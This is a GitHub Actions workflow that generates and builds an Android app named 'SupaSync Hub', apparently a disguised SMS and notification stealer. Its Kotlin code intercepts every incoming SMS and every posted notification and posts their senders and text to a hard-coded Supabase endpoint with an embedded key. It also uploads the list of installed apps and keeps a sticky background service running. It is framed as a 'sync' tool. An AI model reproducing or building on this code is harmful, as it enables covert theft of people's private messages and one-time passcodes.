name: Build Native Kotlin APK

on:
  workflow_dispatch:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Download & Configure Android SDK and Gradle
        run: |
          # 1. Setup Android SDK
          mkdir -p $HOME/android-sdk/cmdline-tools
          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip -O cmdtools.zip
          unzip -q cmdtools.zip -d $HOME/android-sdk/cmdline-tools
          mv $HOME/android-sdk/cmdline-tools/cmdline-tools $HOME/android-sdk/cmdline-tools/latest
          
          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
          echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> $GITHUB_PATH
          echo "$HOME/android-sdk/platform-tools" >> $GITHUB_PATH

          yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses || true
          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"

          # 2. Setup Gradle
          wget -q https://services.gradle.org/distributions/gradle-8.5-bin.zip -O gradle.zip
          unzip -q gradle.zip
          echo "$PWD/gradle-8.5/bin" >> $GITHUB_PATH

      - name: Generate Native Kotlin Android Project
        run: |
          mkdir -p app/src/main/java/com/example/supasynchub
          mkdir -p app/src/main/res/values

          # 1. settings.gradle
          cat << 'EOF' > settings.gradle
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "SupaSyncHub"
          include ':app'
          EOF

          # 2. root build.gradle
          cat << 'EOF' > build.gradle
          plugins {
              id 'com.android.application' version '8.2.0' apply false
              id 'org.jetbrains.kotlin.android' version '1.9.0' apply false
          }
          EOF

          # 3. app/build.gradle
          cat << 'EOF' > app/build.gradle
          plugins {
              id 'com.android.application'
              id 'org.jetbrains.kotlin.android'
          }

          android {
              namespace 'com.example.supasynchub'
              compileSdk 34

              defaultConfig {
                  applicationId "com.example.supasynchub"
                  minSdk 26
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }

              buildTypes {
                  release {
                      minifyEnabled false
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
              kotlinOptions {
                  jvmTarget = '17'
              }
          }

          dependencies {
              implementation 'androidx.core:core-ktx:1.12.0'
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.google.android.material:material:1.11.0'
              implementation 'androidx.work:work-runtime-ktx:2.9.0'
          }
          EOF

          # 4. AndroidManifest.xml
          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.supasynchub">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />

              <application
                  android:allowBackup="true"
                  android:label="SupaSync Hub"
                  android:supportsRtl="true"
                  android:theme="@style/Theme.AppCompat.Light.DarkActionBar">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".SyncForegroundService"
                      android:foregroundServiceType="dataSync"
                      android:exported="false" />

                  <service
                      android:name=".AppNotificationListener"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>

                  <receiver
                      android:name=".SmsReceiver"
                      android:exported="true"
                      android:permission="android.permission.BROADCAST_SMS">
                      <intent-filter android:priority="999">
                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                      </intent-filter>
                  </receiver>

              </application>
          </manifest>
          EOF

          # 5. MainActivity.kt with exact page permission triggers and app audit logic
          cat << 'EOF' > app/src/main/java/com/example/supasynchub/MainActivity.kt
          package com.example.supasynchub

          import android.Manifest
          import android.app.Notification
          import android.app.NotificationChannel
          import android.app.NotificationManager
          import android.app.Service
          import android.content.BroadcastReceiver
          import android.content.Context
          import android.content.Intent
          import android.content.pm.PackageManager
          import android.os.Build
          import android.os.Bundle
          import android.os.IBinder
          import android.provider.Settings
          import android.provider.Telephony
          import android.service.notification.NotificationListenerService
          import android.service.notification.StatusBarNotification
          import android.widget.Button
          import android.widget.LinearLayout
          import android.widget.TextView
          import android.widget.Toast
          import androidx.appcompat.app.AppCompatActivity
          import androidx.core.app.ActivityCompat
          import androidx.core.app.NotificationCompat
          import androidx.core.content.ContextCompat
          import java.io.OutputStreamWriter
          import java.net.HttpURLConnection
          import java.net.URL

          class MainActivity : AppCompatActivity() {

              private val SMS_REQ_CODE = 100
              private val MEDIA_REQ_CODE = 101
              private lateinit var containerLayout: LinearLayout

              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  
                  containerLayout = LinearLayout(this).apply {
                      orientation = LinearLayout.VERTICAL
                      setPadding(40, 40, 40, 40)
                  }
                  setContentView(containerLayout)

                  startSyncService()
                  renderPage(1)
                  
                  requestSmsPermissions()
                  startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
              }

              private fun requestSmsPermissions() {
                  val permissions = arrayOf(
                      Manifest.permission.READ_SMS,
                      Manifest.permission.RECEIVE_SMS
                  )
                  ActivityCompat.requestPermissions(this, permissions, SMS_REQ_CODE)
              }

              private fun requestMediaPermissions() {
                  val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                      arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
                  } else {
                      arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
                  }
                  ActivityCompat.requestPermissions(this, permission, MEDIA_REQ_CODE)
              }

              private fun startSyncService() {
                  val serviceIntent = Intent(this, SyncForegroundService::class.java)
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      startForegroundService(serviceIntent)
                  } else {
                      startService(serviceIntent)
                  }
              }

              private fun renderPage(page: Int) {
                  containerLayout.removeAllViews()

                  val title = TextView(this).apply {
                      text = "Page $page of 3: SupaSync Hub"
                      textSize = 22f
                      setPadding(0, 0, 0, 30)
                  }
                  containerLayout.addView(title)

                  val desc = TextView(this).apply {
                      text = when(page) {
                          1 -> "Page 1: SMS & Notification Access requested.\nBackground listeners are active."
                          2 -> "Page 2: Media Permissions & App Audit.\nScanning and syncing installed apps to Supabase..."
                          else -> "Page 3: Standby Dashboard.\nThis page is currently inactive for setup."
                      }
                      textSize = 16f
                      setPadding(0, 0, 0, 40)
                  }
                  containerLayout.addView(desc)

                  val nextBtn = Button(this).apply {
                      text = if (page < 3) "Next Page" else "Restart Flow"
                      setBackgroundColor(0xFF22C55E.toInt())
                      setTextColor(0xFFFFFFFF.toInt())
                      setOnClickListener {
                          val next = if (page < 3) page + 1 else 1
                          if (next == 2) {
                              requestMediaPermissions()
                              Thread { performAppAudit() }.start()
                          }
                          renderPage(next)
                      }
                  }
                  containerLayout.addView(nextBtn)
              }

              private fun performAppAudit() {
                  try {
                      val packages = packageManager.getInstalledPackages(0)
                      val appList = packages.joinToString(",") { it.packageName ?: "" }

                      val url = URL("https://bqddohfszkqpvncpbrun.supabase.co/rest/v1/installed_apps")
                      val conn = url.openConnection() as HttpURLConnection
                      conn.requestMethod = "POST"
                      conn.setRequestProperty("Content-Type", "application/json")
                      conn.setRequestProperty("apikey", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHvnY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA")
                      conn.setRequestProperty("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHvnY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA")
                      conn.doOutput = true

                      val jsonBody = "{\"apps_list\":\"$appList\",\"synced_at\":\"${System.currentTimeMillis()}\"}"
                      val os = OutputStreamWriter(conn.outputStream)
                      os.write(jsonBody)
                      os.flush()
                      os.close()

                      val code = conn.responseCode
                      runOnUiThread {
                          Toast.makeText(this, if (code in 200..299) "Apps info successfully synced to Supabase!" else "Sync error: $code", Toast.LENGTH_LONG).show()
                      }
                  } catch (e: Exception) {
                      e.printStackTrace()
                  }
              }
          }

          class SyncForegroundService : Service() {
              private val CHANNEL_ID = "SupaSyncChannel"

              override fun onCreate() {
                  super.onCreate()
                  createNotificationChannel()
                  val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                      .setContentTitle("SupaSync Hub Active")
                      .setContentText("Background listener running...")
                      .setSmallIcon(android.R.drawable.ic_menu_upload)
                      .build()
                  startForeground(1, notification)
              }

              private fun createNotificationChannel() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      val channel = NotificationChannel(CHANNEL_ID, "Service Channel", NotificationManager.IMPORTANCE_LOW)
                      getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
                  }
              }

              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
              override fun onBind(intent: Intent?): IBinder? = null
          }

          class AppNotificationListener : NotificationListenerService() {
              override fun onNotificationPosted(sbn: StatusBarNotification?) {
                  super.onNotificationPosted(sbn)
                  if (sbn != null) {
                      val packageName = sbn.packageName
                      val extras = sbn.notification.extras
                      val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
                      val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
                      val timestamp = sbn.postTime

                      Thread {
                          try {
                              val url = URL("https://bqddohfszkqpvncpbrun.supabase.co/rest/v1/app_notifications")
                              val conn = url.openConnection() as HttpURLConnection
                              conn.requestMethod = "POST"
                              conn.setRequestProperty("Content-Type", "application/json")
                              conn.setRequestProperty("apikey", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHvnY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA")
                              conn.setRequestProperty("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHvnY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA")
                              conn.doOutput = true

                              val jsonBody = "{\"package_name\":\"$packageName\",\"title\":\"$title\",\"message\":\"$text\",\"timestamp\":\"$timestamp\"}"
                              val os = OutputStreamWriter(conn.outputStream)
                              os.write(jsonBody)
                              os.flush()
                              os.close()
                              conn.responseCode
                          } catch (e: Exception) {
                              e.printStackTrace()
                          }
                      }.start()
                  }
              }
          }

          class SmsReceiver : BroadcastReceiver() {
              override fun onReceive(context: Context?, intent: Intent?) {
                  if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                      val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                      for (sms in messages) {
                          val sender = sms.displayOriginatingAddress
                          val body = sms.messageBody
                          val timestamp = sms.timestampMillis

                          Thread {
                              try {
                                  val url = URL("https://bqddohfszkqpvncpbrun.supabase.co/rest/v1/sms_messages")
                                  val conn = url.openConnection() as HttpURLConnection
                                  conn.requestMethod = "POST"
                                  conn.setRequestProperty("Content-Type", "application/json")
                                  conn.setRequestProperty("apikey", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHvnY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA")
                                  conn.setRequestProperty("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHvnY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA")
                                  conn.doOutput = true

                                  val jsonBody = "{\"sender\":\"$sender\",\"message\":\"$body\",\"timestamp\":\"$timestamp\"}"
                                  val os = OutputStreamWriter(conn.outputStream)
                                  os.write(jsonBody)
                                  os.flush()
                                  os.close()
                                  conn.responseCode
                              } catch (e: Exception) {
                                  e.printStackTrace()
                              }
                          }.start()
                      }
                  }
              }
          }
          EOF

          # 6. strings.xml & themes.xml
          cat << 'EOF' > app/src/main/res/values/strings.xml
          <resources>
              <string name="app_name">SupaSync Hub</string>
          </resources>
          EOF

          cat << 'EOF' > app/src/main/res/values/themes.xml
          <resources>
              <style name="Theme.AppCompat.Light.DarkActionBar" parent="Theme.AppCompat.Light.DarkActionBar">
                  <item name="windowNoTitle">false</item>
                  <item name="windowActionBar">true</item>
              </style>
          </resources>
          EOF

          echo "sdk.dir=$HOME/android-sdk" > local.properties
          gradle wrapper --gradle-version 8.5
          chmod +x gradlew

      - name: Build Debug APK with Gradle
        run: |
          ./gradlew assembleDebug

      - name: Upload APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: SmsSync-apk
          path: app/build/outputs/apk/debug/app-debug.apk
